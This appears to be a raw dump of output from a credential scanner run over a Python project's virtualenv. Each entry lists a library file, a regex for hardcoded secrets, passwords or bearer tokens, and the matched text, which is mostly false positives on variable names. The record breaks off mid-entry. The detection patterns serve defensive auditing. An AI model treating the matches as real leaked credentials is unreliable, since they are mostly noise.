(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/configargparse.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/coverage/sqldata.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/click/utils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/dmypy_server.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/semanal.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/semanal.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/config_parser.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/config_parser.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/options.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/build.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/build.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/build.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/mypy/build.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tzlocal/unix.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/vengine_cpy.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/verifier.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/vengine_gen.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/cparser.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/api.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/api.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/cffi/api.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/tsig.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;secret&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tomlkit/items.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/iterutils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/boltons/fileutils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/telegram/constants.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/telegram/constants.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/telegram/constants.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/telegram/helpers.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiohttp/web_urldispatcher.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/shortcuts.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/psycopg3_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/psycopg3_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/postgres_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/postgres_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/postgres_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/postgres_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/postgres_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/sqlcipher_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/playhouse/sqlcipher_ext.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/types.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/mypy.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/mypy.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/starlette/datastructures.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/pywsgi.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/_config.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/semgrep/constants.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/semgrep/constants.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/semgrep/config_resolver.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/semgrep/config_resolver.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dparse/parser.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/httpx/_urls.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/astroid/rebuilder.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/cmd.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;PWD&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;TOKEN&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/git/remote.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/werkzeug/debug/tbtools.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;SECRET&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/general_hardcoded_password.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/bandit/plugins/general_hardcoded_password.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/zmq/ssh/tunnel.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/zmq/ssh/tunnel.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6749/resource_protector.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer a-token-string&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc7523/token.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc7523/token.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer grant&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc7523/token.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc7523/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer import&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc7523/client.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/validator.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/token.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/token.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/parameters.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/parameters.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/parameters.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer tokens.&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/parameters.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer h480djs93hd8&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth2/rfc6750/parameters.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/signature.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/signature.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, 